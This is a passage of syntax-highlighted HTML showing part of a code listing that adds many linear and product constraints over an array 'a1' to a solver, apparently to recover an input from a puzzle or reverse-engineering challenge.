punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6022286</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre><span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"233\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"234\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"235\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">636956022</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"247\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"248\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"249\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"250\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"252\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"253\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"254\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">10631829</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6191333</span></pre></td></tr><tr><td data-num=\"276\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"277\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"278\"></td><td><pre><span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"279\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"280\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"281\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"282\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"283\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">890415359</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"292\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"293\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"294\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"295\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"296\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"297\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"304\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"305\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"306\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"307\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"308\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">23493664</span></pre></td></tr><tr><td data-num=\"309\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"310\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"311\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span 